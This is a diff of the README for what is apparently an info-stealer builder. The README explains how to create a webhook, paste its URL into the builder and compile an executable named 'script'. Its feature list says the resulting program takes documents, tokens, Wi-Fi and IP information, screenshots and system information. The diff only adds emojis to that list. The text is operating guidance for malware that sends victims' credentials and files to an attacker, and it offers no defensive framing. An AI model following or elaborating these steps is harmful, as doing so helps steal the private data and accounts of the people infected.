@@ -8,5 +8,5 @@ after that find the desired channel for the info to be sent to, after that press
 entergrations>webhooks and press create webhook, copy the webhook URL and paste it into the builder and press ENTER and wait for the file to compiled,
 after its done compiling you can now go to the dist folder, and there should be a .EXE file named "script".
 
-# Futures
-documents,tokens,WI-FI information,IP-information,screenshot,system information
+# Futures 📊
+.documents📁 , tokens 🍪 , WI-FI information 🌐 , IP-information 🏠, screenshot 💻, system information 🛠️.
